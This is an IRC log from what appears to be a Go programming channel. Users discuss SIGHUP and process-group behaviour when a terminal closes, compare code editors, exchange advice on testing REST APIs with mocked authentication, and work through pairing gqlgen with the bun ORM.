[00:00:05] *** Joins: dmathieu (~textual@pop.92-184-110-204.mobile.abo.orange.fr)
[00:01:55] *** Joins: SebastianM (~seba@user/sebastianm)
[00:07:34] <icholy> Tv_: I'm confused because I ctrl-d my terminal emulator which closes it, but the child process (created in a different group but same session) keeps going
[00:08:03] *** Quits: sord937 (~sord937@gateway/tor-sasl/sord937) (Quit: sord937)
[00:10:43] *** Quits: dmathieu (~textual@pop.92-184-110-204.mobile.abo.orange.fr) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[00:11:00] *** Joins: davidkrauser (~davidkrau@user/davidkrauser)
[00:11:20] <icholy> https://play.golang.org/p/RwZnpzRD650
[00:14:56] <Tv_> icholy: it's really not gonna surprise me at all that even as good of a write-up as that Linus one is, there's something off about it
[00:15:10] *** Quits: SebastianM (~seba@user/sebastianm) (Quit: Bye)
[00:15:31] <Tv_> icholy: oh attach stdin too
[00:18:32] *** Quits: tedwing (~anon@lfbn-idf3-1-1409-99.w109-221.abo.wanadoo.fr) (Ping timeout: 272 seconds)
[00:19:07] *** Joins: fbandov (~fbandov@80.155.23.139)
[00:22:28] <icholy> Tv_: no difference. I'm guessing that gnome-terminal only kills the process groups that it starts instead of finding everything in the session.
[00:22:56] <Tv_> test with xterm or tmux or such
[00:23:10] <Tv_> the intersection of gnome and systems programming scares me
[00:25:41] *** Quits: fbandov (~fbandov@80.155.23.139) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[00:25:41] <icholy> Tv_: same behaviour
[00:26:40] <Tv_> well, likely something is wrong, and we haven't read the right docs yet
[00:26:50] <icholy> I think the hint is that jobs doesn't list it.
[00:27:00] <Tv_> i'm trying to focus on things that don't include opening the POSIX spec
[00:27:24] <icholy> ya I should probably do my job
[00:27:26] <Tv_> icholy: there's two parts. one is the shell voluntarily sending SIGHUPs when it receives SIGHUP, the other is when process leader exits
[00:30:18] *** Quits: llorllale (~llorllale@2607:9880:3a18:69:1536:215e:eaad:4ce4) (Ping timeout: 264 seconds)
[00:32:45] *** Quits: pepee (~user@user/pepee) (Ping timeout: 252 seconds)
[00:33:25] *** Joins: pepee (~user@user/pepee)
[00:34:42] *** Quits: burningserenity (~burningse@142-196-178-216.res.spectrum.com) (Quit: ZNC 1.8.2 - https://znc.in)
[00:34:56] *** Quits: Ergo^ (~ergo@91.238.59.144) (Remote host closed the connection)
[00:35:09] *** Quits: farmstatejake (~farmstate@user/farmstatejake) (Read error: Connection reset by peer)
[00:35:25] *** Joins: Skyz (~Skyz@ool-43538427.dyn.optonline.net)
[00:35:41] *** Quits: amahl (~amahl@dsl-jklbng12-54fbca-64.dhcp.inet.fi) (Ping timeout: 272 seconds)
[00:36:41] *** Joins: fbandov (~fbandov@80.155.23.139)
[00:37:44] *** Joins: Xjs (~jannis@user/xjs)
[00:41:00] *** Quits: fbandov (~fbandov@80.155.23.139) (Ping timeout: 252 seconds)
[00:41:22] <icholy> Tv_: I think this expains what I'm seeing https://unix.stackexchange.com/a/407477/21797
[00:41:49] *** Joins: Torr (~Torr@170.83.146.97)
[00:41:51] <icholy> only the forground session members get the SIGHUP when the leader exits
[00:42:34] *** Quits: pepee (~user@user/pepee) (Ping timeout: 245 seconds)
[00:43:02] *** Joins: austin__ (~ausserz@n219073000163.netvigator.com)
[00:44:09] <Tv_> icholy: test for that theory: disown only stops bash's voluntary loop on SIGHUP, if you kill -9 a bash, `sleep 999 &` will also live, but if you kill -HUP the bash, the sleep is SIGHUPped
[00:45:20] <Tv_> icholy: anyway, cgroups are the new hotness, and coincidentally i'm writing a remote shell where sessions are proper cgroups
[00:45:53] *** Joins: jw4 (~weldon@user/jw4)
[00:45:56] * icholy has had enough unix for one day
[00:57:23] *** Quits: Kane (~Kane@2a01:e34:ee89:5d90:91eb:49c0:e1ba:dea9) (Quit: Leaving)
[01:00:03] *** Quits: Torr (~Torr@170.83.146.97) (Quit: leaving)
[01:00:36] *** Quits: jw4 (~weldon@user/jw4) (Quit: leaving)
[01:06:08] *** Joins: Garb0 (~Garb0@user/garb0)
[01:08:32] *** Quits: shka (~herr@109.231.62.239) (Ping timeout: 244 seconds)
[01:09:36] *** Quits: gzj (~GZJ0X@199.193.127.217.16clouds.com) (Remote host closed the connection)
[01:12:24] *** Joins: Torr (~Torr@170.83.146.97)
[01:13:11] *** Joins: amahl (~amahl@dsl-jklbng12-54fbca-64.dhcp.inet.fi)
[01:13:27] *** Quits: dyslexicat (~dyslexica@ymir.whatbox.ca) (Ping timeout: 252 seconds)
[01:17:15] *** Joins: koo6 (~koo6@89-24-13-235.customers.tmcz.cz)
[01:25:28] *** Quits: jinie (~jimmy@188.114.173.37) (Quit: ZNC 1.8.2 - https://znc.in)
[01:25:32] *** Joins: fishgod (~evan@user/fishgod)
[01:27:34] *** Quits: mikoto-chan (~mikoto-ch@ip-213-49-189-31.dsl.scarlet.be) (Ping timeout: 272 seconds)
[01:27:58] *** Quits: Crassus (~Crassus@user/crassus) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[01:28:04] *** Joins: jinie (~jimmy@188.114.173.37)
[01:28:50] *** Quits: mmfood (~mmfood@194.103.157.93) (Ping timeout: 272 seconds)
[01:30:08] *** Joins: mmfood (~mmfood@45.135.187.117)
[01:32:25] *** Quits: icholy (~icholy@68.71.18.45) (Quit: leaving)
[01:41:21] *** Quits: jolof (~jolof@user/jolof) (Quit: leaving)
[01:43:41] *** Quits: Skyz (~Skyz@ool-43538427.dyn.optonline.net) (Quit: Client closed)
[01:44:06] *** Quits: binkers (~binkers@user/binkers) (Quit: ZNC - https://znc.in)
[01:46:55] *** Joins: tedwing (~anon@lfbn-idf3-1-1409-99.w109-221.abo.wanadoo.fr)
[01:47:06] *** Quits: amahl (~amahl@dsl-jklbng12-54fbca-64.dhcp.inet.fi) (Remote host closed the connection)
[01:59:13] *** Quits: prio (~jonathan@195.162.84.188) (Quit: Konversation terminated!)
[02:00:28] *** Quits: eck0 (~Android@mobile-166-173-61-29.mycingular.net) (Quit: -a- Connection Timed Out)
[02:00:48] *** Joins: eck0 (~Android@mobile-166-173-61-29.mycingular.net)
[02:09:08] *** Quits: tedwing (~anon@lfbn-idf3-1-1409-99.w109-221.abo.wanadoo.fr) (Quit: leaving)
[02:10:59] *** Quits: saml (~saml@cpe-74-73-80-162.nyc.res.rr.com) (Remote host closed the connection)
[02:12:30] *** Quits: Xe (~cadey@tailscale/xe) (Quit: WeeChat 3.1)
[02:12:44] *** Joins: Xe (~cadey@tailscale/xe)
[02:14:35] <src> has anyone tried goland, is it any good?
[02:14:39] <src> maybe I'll give it a spin sometimes
[02:15:25] *** Quits: thing (~thing@user/thing) (Ping timeout: 252 seconds)
[02:17:11] *** Joins: thing (~thing@user/thing)
[02:21:00] *** Quits: mrig (~mrig@user/mrig) (Quit: WeeChat 3.1)
[02:22:13] *** Joins: mikoto-chan (~mikoto-ch@ip-213-49-189-31.dsl.scarlet.be)
[02:25:13] <anonfunc[m]> src: I use it on a regular basis. pretty good for my tastes
[02:25:50] *** Quits: ente_ (~ente@p200300dc5f4037016fbea028d47fea8e.dip0.t-ipconnect.de) (Quit: WeeChat 3.1)
[02:26:04] *** Joins: ente_ (~ente@p200300dc5f4037016fbea028d47fea8e.dip0.t-ipconnect.de)
[02:26:17] *** Quits: ente_ (~ente@p200300dc5f4037016fbea028d47fea8e.dip0.t-ipconnect.de) (Client Quit)
[02:26:31] *** Joins: ente_ (~ente@p200300dc5f4037016fbea028d47fea8e.dip0.t-ipconnect.de)
[02:30:35] <src> anonfunc[m]: awesome, thanks. I just saw I could get a free educational license probably, so I will definitely consider it
[02:31:27] <src> I used vscode, but install sublime text again and thought about using both in parallel for a while and then decide, but Goland does seem interesting
[02:31:28] <anonfunc[m]> src: If you can get it via educational license I highly recommend to give it a go (no pun intended)
[02:31:51] <src> s/install/installed
[02:32:40] <src> anonfunc[m]: they also have a 30 day trial period
[02:32:45] <src> so I could try it regardless
[02:32:46] *** Quits: ente_ (~ente@p200300dc5f4037016fbea028d47fea8e.dip0.t-ipconnect.de) (Quit: WeeChat 3.1)
[02:33:11] *** Quits: ratelius (ratelius@gateway/vpn/protonvpn/ratelius) (Quit: WeeChat 3.2-rc1)
[02:34:00] <anonfunc[m]> src: true that, but their whole package license is more on the pricey side. Don't know how much goland standalone even costs
[02:34:47] <src> 199 first year, than it decreases yearly
[02:35:23] *** Joins: ente_ (~ente@p200300dc5f4037016fbea028d47fea8e.dip0.t-ipconnect.de)
[02:36:04] <src> compared to free (vscode, atom, etc) or 99$ for sublime-text (for 3 years major version upgrades), definitely pricey
[02:36:38] <src> s/than/then
[02:37:54] *** Quits: iskarian (~iskarian@ip24-253-39-6.lv.lv.cox.net) (Killed (osmium.libera.chat (Nickname regained by services)))
[02:38:04] *** Joins: iskarian (~iskarian@ip24-253-39-6.lv.lv.cox.net)
[02:38:32] *** Quits: theoceaniscool (~theoceani@188.127.173.202) (Ping timeout: 268 seconds)
[02:45:54] <fishgod> Yeah... but does your editor help poor children in Uganda?
[02:46:18] * CommunistWolf pats gedit smugly
[02:46:19] <CommunistWolf> yes
[02:48:13] <src> fishgod: that's not of consideration though when choosing what editor to live in
[02:48:21] *** Quits: salem (~salem@pool-98-111-206-141.pitbpa.fios.verizon.net) (Quit: ZNC 1.8.2 - https://znc.in)
[02:49:16] <fishgod> src: Your privilege is showing.
[02:50:14] *** Joins: salem (~salem@pool-98-111-206-141.pitbpa.fios.verizon.net)
[02:50:54] <src> fishgod: isn't it privilege to make decisions based on social considerations?
[02:51:46] <src> (or framing it differently: to be able to afford to make decisions primarily based on social considerations)
[02:51:57] <src> but this is getting too off-topic :P
[02:52:11] <fishgod> src: Pretty nice to be able to ignore poor children in Uganda... I'm just being silly. Please ignore me.
[02:53:58] <src> I'm pretty sure I'm stupid here but why is this a deadlock? https://play.golang.org/p/2LH13FR3B0T
[02:54:38] <src> oh I'm sorry, I got it ...
[02:54:53] *** Quits: fputs (~fputs@67.59.83.166) (Remote host closed the connection)
[02:58:49] *** Quits: acidfu (~nicolasbo@2605:8d80:5e0:f140:2cab:f128:5b00:a5f6) (Ping timeout: 272 seconds)
[03:01:18] *** Quits: vptr (~tadas@user/vptr) (Ping timeout: 272 seconds)
[03:01:19] *** Joins: dyslexicat (~dyslexica@212.253.59.190)
[03:01:43] *** Joins: iliaf (~iliaf@user/iluxa)
[03:02:26] *** Joins: jackneill (~jackneill@20014C4E18049E0024F84D4DC7D3BF88.dsl.pool.telekom.hu)
[03:02:58] *** Quits: iluxa (~iliaf@user/iluxa) (Ping timeout: 240 seconds)
[03:03:06] *** Joins: iliaf- (~iliaf@user/iluxa)
[03:04:12] *** Joins: sen (~sen@static.7.141.216.95.clients.your-server.de)
[03:04:19] *** Quits: paddymahoney (~paddymaho@cpe9050ca207f83-cm9050ca207f80.cpe.net.cable.rogers.com) (Remote host closed the connection)
[03:04:49] *** Parts: sen (~sen@static.7.141.216.95.clients.your-server.de) ()
[03:05:38] *** Quits: iliaf (~iliaf@user/iluxa) (Ping timeout: 240 seconds)
[03:05:39] *** Quits: dyslexicat (~dyslexica@212.253.59.190) (Ping timeout: 252 seconds)
[03:06:45] *** Quits: DeltaNova (~DeltaNova@user/deltanova) (Quit: WeeChat 3.0.1)
[03:06:45] *** Quits: mikoto-chan (~mikoto-ch@ip-213-49-189-31.dsl.scarlet.be) (Ping timeout: 252 seconds)
[03:13:29] *** Joins: gilesc (~textual@2603-8001-3600-dad7-cd0d-5113-7dba-ae3b.res6.spectrum.com)
[03:19:15] *** Quits: dr0n (~nabromov@94.11.23.235) (Ping timeout: 244 seconds)
[03:22:59] *** Quits: koo6 (~koo6@89-24-13-235.customers.tmcz.cz) (Ping timeout: 245 seconds)
[03:24:53] <ente_> how would you typically write unit tests for a rest api? should you test every endpoint individually (with authentication)? my problem was that users need to be authenticated to do most things so i would have to register/login for every test (or do some hack with the session stored in an environment variable)
[03:26:32] *** Quits: Guest9 (~textual@c-73-51-174-246.hsd1.il.comcast.net) (Read error: Connection reset by peer)
[03:29:13] *** Quits: eck0 (~Android@mobile-166-173-61-29.mycingular.net) (Quit: -a- Connection Timed Out)
[03:29:34] *** Joins: eck0 (~Android@mobile-166-173-61-29.mycingular.net)
[03:33:15] <fishgod> ente_: I test every endpoint individually (and spin up new users in the test database when doing so). My tests fall closer to integration and end-to-end tests.
[03:35:16] *** Quits: paulgrmn (~paulgrmn@user/paulgrmn) (Ping timeout: 244 seconds)
[03:37:28] <jemaclus> I do write my tests in a couple of different ways. First, the business logic is unit tested to as close to 100% as I can get it. (Some things just aren't worth testing.) Then I write integration tests that mock external dependencies (including DBs) to track each of the possible outcomes for each endpoint and ensure that the inputs/outputs are returned with expected values.
[03:37:32] <gilesc> you dont want to hack the session stuff because you want your tests to be able to run concurrently. Most places would have some sort of test infrastructure code that allowed them to easily create users for test scenarios and depending on your app, store it where it needs to be stored so you can access it in your testing.
[03:38:11] <jemaclus> Finally, I write end-to-end tests as fishgod described, where test data is created and destroyed with as close to real calls to external dependencies as possible. This last group won't block a deploy (because I can't control if, say, Stripe goes down), but it's useful for ensuring that our code and everything works as expected.
[03:39:09] <jemaclus> Yep, that's absolutely correct. You should generally either fake/mock those users or setup/destroy them for the tests.
[03:41:09] *** iliaf- is now known as iluxa
[03:41:11] <jemaclus> I probably wouldn't test authentication along with everything else. I'd have something that fakes it for my test suite, and then have another suite of tests specifically to test the authentication mechanism.
[03:42:18] <jemaclus> Like, if I had a test suite that tested whether my file uploads system worked, I wouldn't necessarily want those tests to fail because there's a bug in the authentication system. I'd want my file upload tests to test uploading files, and my authentication tests to test authentication.
[03:42:28] <jemaclus> My two cents.
[03:45:54] *** iskarian is now known as Guest5048
[03:45:55] *** Quits: Guest5048 (~iskarian@ip24-253-39-6.lv.lv.cox.net) (Killed (tin.libera.chat (Nickname regained by services)))
[03:46:04] *** Joins: iskarian (~iskarian@ip24-253-39-6.lv.lv.cox.net)
[03:47:16] <ente_> for example if I have a function like GetActiveCourses I would have to 1. create a user 2. log in 3. log in with an external service 4. create a record 5. test the thing
[03:47:30] <ente_> and then do that like 10 times for 10 endpoints
[03:47:34] <ente_> is that really necessary
[03:48:26] *** Quits: iskarian (~iskarian@ip24-253-39-6.lv.lv.cox.net) (Killed (strontium.libera.chat (Nickname regained by services)))
[03:48:36] *** Joins: iskarian (~iskarian@ip24-253-39-6.lv.lv.cox.net)
[03:52:43] *** Joins: saml (~saml@cpe-74-73-80-162.nyc.res.rr.com)
[03:52:45] <jemaclus> Typically you would mock the external authentication service
[03:53:04] *** iskarian is now known as Guest9859
[03:53:14] *** Joins: iskarian (~iskarian@ip24-253-39-6.lv.lv.cox.net)
[03:54:06] <jemaclus> Essentially it would be a fake authenticator that would return whatever you want it to return, but wouldn't actually conduct the business logic to actually authenticate.
[03:56:08] *** Quits: Guest9859 (~iskarian@ip24-253-39-6.lv.lv.cox.net) (Ping timeout: 264 seconds)
[03:56:50] <jemaclus> I've used Mockery in the past for mocking dependencies: https://github.com/vektra/mockery
[03:58:33] <jemaclus> If you're testing GetActiveCourses, then three things are happening in that function: 1) it's authenticating the user, 2) it's retrieving the courses, and 3) it's returning the response. Any of those steps could go wrong in a number of different ways. Auth could fail because the creds were bad or because the auth service is down or because network latency takes too long... it's really hard to fake those with real API calls to those external services.
[03:58:33] <jemaclus>  So you fake the responses and ensure that your application handles them correctly.
[03:58:36] *** Joins: acidfu (~nicolasbo@2605:8d80:5e0:9183:4161:760e:1b80:bbdb)
[03:59:29] *** Quits: iskarian (~iskarian@ip24-253-39-6.lv.lv.cox.net) (Killed (platinum.libera.chat (Nickname regained by services)))
[03:59:37] <jemaclus> So you have a mock authenticator that can return success or return with different errors for different scenarios (404 user not found, 400 bad creds, 500 server not responding, timeouts, etc), and then you write tests that use that mock authenticator to return each of those errors and ensure that your GetActiveCourses function returns the appropriate responses based on those internal errors
[04:02:03] *** Quits: sudoforge (~sudoforge@wireguard/tunneler/sudoforge) (Quit: 404)
[04:03:20] *** Quits: tg (~tg@rockylinux/infra/tg) (Quit: tg)
[04:08:24] *** Quits: jespada (~jespada@90.254.242.55) (Ping timeout: 245 seconds)
[04:10:36] *** Quits: Techcable (~Techcable@168.235.93.147) (Quit: ZNC - https://znc.in)
[04:11:09] *** Joins: Techcable (~Techcable@168.235.93.147)
[04:11:39] *** Joins: jespada (~jespada@90.254.242.55)
[04:12:13] *** Quits: gilesc (~textual@2603-8001-3600-dad7-cd0d-5113-7dba-ae3b.res6.spectrum.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[04:19:20] *** Joins: dyslexicat (~dyslexica@212.253.59.190)
[04:23:15] *** Joins: vptr (~vptr@user/vptr)
[04:23:19] *** Quits: dyslexicat (~dyslexica@212.253.59.190) (Ping timeout: 244 seconds)
[04:23:57] *** Quits: Techcable (~Techcable@168.235.93.147) (Quit: ZNC - https://znc.in)
[04:25:16] *** Joins: Techcable (~Techcable@168.235.93.147)
[04:26:05] *** Quits: omegatron (~some@p5b056bc7.dip0.t-ipconnect.de) (Quit: What happened? You quit!)
[04:27:39] *** Quits: krthnz_ (~quassel@dslb-188-097-015-215.188.097.pools.vodafone-ip.de) (Ping timeout: 244 seconds)
[04:28:15] *** Joins: krthnz (~quassel@dslb-188-109-141-016.188.109.pools.vodafone-ip.de)
[04:29:21] *** Joins: gregf (~gregf@user/gregf)
[04:33:39] *** Joins: SincereFox (uid337158@user/sincerefox)
[04:43:29] <gregf> I'm using gqlgen and bun ORM. I have to have bun.BaseModel in my models structs. I don't see a way to do that with gqlgen as it auto generates the structs for your graphql schema. So I created another "extender struct" and stuck bun.BaseModel at the top and model.User, the struct from gqlgen into it. The issue I'm having is when I go to return my data from the schema resolver, I have to return
[04:43:31] <gregf> just model.User. So the question is once I have data scanned into the struct with bun.BaseModel, how am I able to get that data back into model.User so gqlgen can return it as graphql data?
[04:45:24] *** Joins: llorllale (~llorllale@2607:9880:3a18:69:84bd:6edb:5762:9573)
[04:46:02] *** Quits: predmijat (~predmijat@mail.strogopro.com) (Quit: bye)
[04:47:35] *** Joins: predmijat (~predmijat@mail.strogopro.com)
[04:58:07] *** Joins: vptr_ (~tadas@cpe-24-162-255-196.nc.res.rr.com)
[04:58:52] *** Joins: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com)
[04:59:28] <Tv_> that sounds dangerously like attempts at inheritance
[05:03:20] *** Quits: vptr_ (~tadas@cpe-24-162-255-196.nc.res.rr.com) (Ping timeout: 264 seconds)
[05:04:29] <gregf> What should I be doing in this situation?
[05:05:11] <Tv_> what's the problem being solved?
[05:05:54] <Tv_> gregf: https://www.gobeyond.dev/standard-package-layout/ is a good start
[05:06:21] <Tv_> doesn't make sense for the smallest things, but by the time you have "business logic" it starts to make sense
[05:07:27] <gregf> I'm using a DAL right now as far as how I laid my code out.
[05:07:36] <gregf> I'll go read that, I think I have once before.
[05:08:20] <Tv_> i wish there was a really good write-up of the "ports and adapters" thing somewhere, but i have yet to stumble on one
[05:09:41] <gregf> The problem at hand is gqlgen for graphql in go, it auto generates your models for you based on a schema. I have to have my models contain bun.BaseModel as I was saying. So I was trying to find a way of doing that. If I was to modify the model files it generates it would get overwritten each time I add a new table to my database for example.
[05:10:52] <Tv_> "have to"?
[05:11:18] <Tv_> anyway, your problem is you're confusing database types, graphql types, and business logic
[05:11:26] <Tv_> they don't align in larger apps, anyway
[05:12:34] *** Joins: mosen (~mosen@159-196-125-15.9fc47d.syd.static.aussiebb.net)
[05:16:00] *** Quits: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[05:16:15] <gregf> my graphql models and database models are identical besides this one field the ORM wants in there. Does it really make sense to create the same structs twice? Just trying to understand what you are telling me.
[05:17:15] *** Joins: R2robot (~R2robot@user/r2robot)
[05:17:35] <Tv_> you're trying to smash together an opinionated ORM and a OGraphM
[05:18:12] <Tv_> and gqlgen can use existing types, but there's limits on what they have to look like
[05:18:29] <gregf> so probably should just stick with something like pgx to make it play together better?
[05:19:02] <Tv_> hell, they have examples about ORMs. https://gqlgen.com/recipes/modelgen-hook/
[05:19:22] <gregf> thanks sorry to be such a pita
[05:19:31] <gregf> I didn't see that when reading
[05:23:44] *** Joins: burningserenity (~burningse@2603:9001:f01:ad99::1006)
[05:37:41] *** Quits: Rhys- (Rhys@help.lux.melted.me) (Quit: R.I.P)
[05:38:39] *** Quits: Garb0 (~Garb0@user/garb0) (Quit: Garb0)
[05:39:24] *** Joins: Rhvs (Rhys@help.lux.melted.me)
[05:40:08] *** Joins: pepee (~user@user/pepee)
[05:48:25] *** Joins: BenLubar (~ben@cpe-65-28-175-139.wi.res.rr.com)
[05:51:25] <BenLubar> I think this runtime crash is due to a data race but that doesn't make any sense because js/wasm is single-threaded: https://gist.github.com/BenLubar/80c508267ea1353082bffdfebfb39d72
[06:02:52] *** Quits: Rhvs (Rhys@help.lux.melted.me) (Quit: R.I.P)
[06:04:46] *** Joins: Rhvs (Rhys@help.lux.melted.me)
[06:07:31] *** Quits: vptr (~vptr@user/vptr) (Remote host closed the connection)
[06:09:26] *** Quits: burningserenity (~burningse@2603:9001:f01:ad99::1006) (Ping timeout: 268 seconds)
[06:10:43] *** Joins: burningserenity (~burningse@2603:9001:f01:ad99::1006)
[06:11:19] *** Quits: Rhvs (Rhys@help.lux.melted.me) (Quit: R.I.P)
[06:12:04] *** Joins: Rhvs (Rhys@help.lux.melted.me)
[06:14:44] *** Quits: Rhvs (Rhys@help.lux.melted.me) (Client Quit)
[06:16:19] *** Quits: Torr (~Torr@170.83.146.97) (Ping timeout: 245 seconds)
[06:16:38] *** Joins: Rhvs (Rhys@help.lux.melted.me)
[06:18:20] *** Quits: CommunistWolf (~gulag@user/communistwolf) (Ping timeout: 272 seconds)
[06:20:05] *** Quits: KekSi (~KekSi@x4dbd5d7c.dyn.telefonica.de) (Ping timeout: 244 seconds)
[06:21:47] *** Joins: CommunistWolf (~gulag@user/communistwolf)
[06:23:43] *** Quits: burningserenity (~burningse@2603:9001:f01:ad99::1006) (Quit: ZNC 1.8.2 - https://znc.in)
[06:25:01] *** Joins: KekSi (~KekSi@x4dbe92c4.dyn.telefonica.de)
[06:28:00] *** Quits: zwr (~Person@2804:14c:5bc5:8b2c:d486:b000:9fc0:b091) (Quit: Lost terminal)
[06:31:03] *** Joins: zwr (~Person@2804:14c:5bc5:8b2c:d486:b000:9fc0:b091)
[06:38:10] *** Quits: gregf (~gregf@user/gregf) (Quit: WeeChat 3.1)
[06:39:40] *** Joins: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com)
[06:52:42] *** Joins: paulgrmn (~paulgrmn@user/paulgrmn)
[06:53:17] *** Quits: SincereFox (uid337158@user/sincerefox) (Quit: Connection closed for inactivity)
[06:54:47] *** Quits: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[06:56:06] *** Quits: austin__ (~ausserz@n219073000163.netvigator.com) (Ping timeout: 252 seconds)
[06:58:09] *** Quits: paulgrmn (~paulgrmn@user/paulgrmn) (Ping timeout: 268 seconds)
[07:03:49] *** Joins: tg (~tg@rockylinux/infra/tg)
[07:11:19] *** Joins: Trancer (trancer@user/trancer)
[07:15:36] *** Quits: alrs_ (alrs@tilde.team) (Quit: leaving)
[07:15:44] *** Quits: saml (~saml@cpe-74-73-80-162.nyc.res.rr.com) (Remote host closed the connection)
[07:24:54] *** Joins: alrs (alrs@tilde.team)
[07:24:55] *** Parts: BenLubar (~ben@cpe-65-28-175-139.wi.res.rr.com) ()
[07:25:53] *** Quits: src (~src@user/src) (Quit: leaving)
[07:31:40] *** Joins: src (~src@user/src)
[07:32:59] <src> I know this is slightly OT probably, but if someone uses sublime text with go maybe send me a message
[07:33:19] <src> trying to set up go linter properly etc and having some troubles and it's tough finding stuff out with subl :/
[07:35:32] *** Quits: gildarts (16abab341f@user/gildarts) (Ping timeout: 272 seconds)
[07:41:01] *** Joins: gildarts (16abab341f@user/gildarts)
[07:46:44] *** Quits: Xjs (~jannis@user/xjs) (Ping timeout: 245 seconds)
[07:48:38] *** Joins: Xjs (~jannis@user/xjs)
[07:51:45] *** Quits: welt[m] (~weltspide@2001:470:69fc:105::15e2) (Ping timeout: 244 seconds)
[07:51:45] *** Quits: phoenix[m] (~phoenixma@2001:470:69fc:105::f9b) (Ping timeout: 244 seconds)
[07:51:45] *** Quits: mrjumper[m] (~mr-jumper@2001:470:69fc:105::7f1) (Ping timeout: 244 seconds)
[07:51:45] *** Quits: archwizard (~archwizar@2001:470:69fc:105::929) (Ping timeout: 244 seconds)
[07:51:45] *** Quits: jai (~darkapex@user/darkapex) (Ping timeout: 244 seconds)
[07:51:55] *** Quits: speatzle_ (~speatzles@2001:470:69fc:105::1003) (Ping timeout: 264 seconds)
[07:51:55] *** Quits: kadoban (~kadoban@user/kadoban) (Ping timeout: 264 seconds)
[07:52:03] *** Quits: bat[m] (~batdice-t@2001:470:69fc:105::19b8) (Ping timeout: 244 seconds)
[07:52:15] *** Quits: ubh (~ubh@2001:470:69fc:105::852) (Ping timeout: 244 seconds)
[07:52:31] *** Quits: worr (~worr@2001:470:69fc:105::78c) (Ping timeout: 264 seconds)
[07:52:31] *** Quits: meain (~meain@2001:470:69fc:105::2db) (Ping timeout: 264 seconds)
[07:52:31] *** Quits: spudly[m] (~spudly@2001:470:69fc:105::18) (Ping timeout: 264 seconds)
[08:21:21] *** Quits: jespada (~jespada@90.254.242.55) (Ping timeout: 252 seconds)
[08:23:46] *** Joins: jespada (~jespada@90.254.242.55)
[08:26:44] *** Quits: yelnah (~felix@2001:44b8:309e:405:6f0:21ff:fe3c:d4d7) (Ping timeout: 245 seconds)
[08:28:10] *** Joins: yelnah (~felix@2001:44b8:3084:400:6f0:21ff:fe3c:d4d7)
[08:32:28] *** Joins: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com)
[08:43:15] *** Joins: SebastianM (~seba@user/sebastianm)
[08:44:52] *** Quits: SebastianM (~seba@user/sebastianm) (Client Quit)
[08:45:56] *** Quits: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[08:47:51] *** Joins: jackneilll (~jackneill@20014C4E1816C9005A5B6CA010723CB9.unconfigured.pool.telekom.hu)
[08:50:54] *** Quits: jackneill (~jackneill@20014C4E18049E0024F84D4DC7D3BF88.dsl.pool.telekom.hu) (Ping timeout: 272 seconds)
[08:52:30] *** Joins: dyslexicat (~dyslexica@212.253.59.190)
[08:56:38] *** Quits: dyslexicat (~dyslexica@212.253.59.190) (Ping timeout: 244 seconds)
[08:59:54] *** Joins: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com)
[09:04:14] *** Quits: vptr (~tadas@cpe-24-162-255-196.nc.res.rr.com) (Ping timeout: 245 seconds)
[09:20:02] *** Joins: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com)
[09:33:01] *** Quits: gilesc (~textual@cpe-172-112-18-165.socal.res.rr.com) (Quit: My MacBook has gone to sleep. ZZZzzz…)
[09:34:21] *** Quits: mmfood (~mmfood@45.135.187.117) (Ping timeout: 244 seconds)
[09:40:40] <b0nn> src: is sublime not set up with linters out of the box?
[09:40:52] <b0nn> Or are you trying to configure in other one(s)
[09:41:30] *** Joins: pupiw (~pupiw@2600:8801:f105:5900:896f:9c7c:6735:b7fc)
[09:43:00] *** Quits: pepee (~user@user/pepee) (Quit: bye $IRC)
[09:45:20] *** Joins: cskr (~cskr@49.207.206.153)
[09:52:04] *** Joins: mrig (~mrig@user/mrig)
[09:53:27] *** Quits: cskr (~cskr@49.207.206.153) (Quit: Leaving)
[09:58:59] *** Joins: kyzaodro (~kyzaodro@91.193.7.42)
[10:01:04] *** Quits: arcatech (~arcatech@user/arcatech) (Remote host closed the connection)
[10:02:31] *** Quits: kyzaodro (~kyzaodro@91.193.7.42) (Read error: Connection reset by peer)
[10:03:05] *** Joins: sord937 (~sord937@gateway/tor-sasl/sord937)
[10:03:26] *** Joins: kyzaodro (~kyzaodro@91.193.7.42)
[10:08:41] *** Joins: dyslexicat (~dyslexica@ymir.whatbox.ca)
[10:10:30] *** Quits: kyzaodro (~kyzaodro@91.193.7.42) (Quit: Quit)
[10:16:55] <src> b0nn: I can't set it up so sublime warns of some stuff, like unexecutable code (some stuff vscode instantly detects)
[10:18:25] <src> but I'm questioning if it is worth it ; considering that subl is used by many the state of some essential packages, documentation , the feedback you get when editing certain config files (nothing at all, so  does it work? doesn't it?) weird
[10:18:39] <src> I tried to like it, I really did
[10:18:41] *** Joins: mmfood (~mmfood@45.135.187.117)
[10:18:58] <b0nn> heh
[10:19:21] <b0nn> I use a different editor and feel (strongly) that editor choice is very subjective and personal
[10:20:34] <b0nn> So, IMO use what works for you, and don't get too hung up on what doesn't (with the advent of LSPs most editors can /do/ all the things that all the other editors can, so it really boils down to look and feel
[10:21:02] <src> I know of course
[10:21:35] <src> not religious about it and don't want to end up just playing sysadmin with a bunch of tools and not getting things done :P
[10:24:12] *** Joins: mikoto-chan (~mikoto-ch@ip-213-49-189-31.dsl.scarlet.be)
[10:25:35] <seebs> i think sometimes an editor acquires a sort of set of community defaults, so like, if a lot of people using sublime are all using the same languages, they'll tend to evolve related tooling.
[10:25:53] <src> seebs: yes I thought the same
[10:28:56] <b0nn> Like "Vim keybindings" :)
[10:29:04] *** Quits: dyslexicat (~dyslexica@ymir.whatbox.ca) (Ping timeout: 272 seconds)
[10:32:03] <mrig> Is guru still used and maintained?
[10:32:33] <mrig> I just had the thought that if I run it from a makefile in vim, I will get the output in a quicklist.
[10:35:05] <endigma> go for the just-works:tm: editor vscode
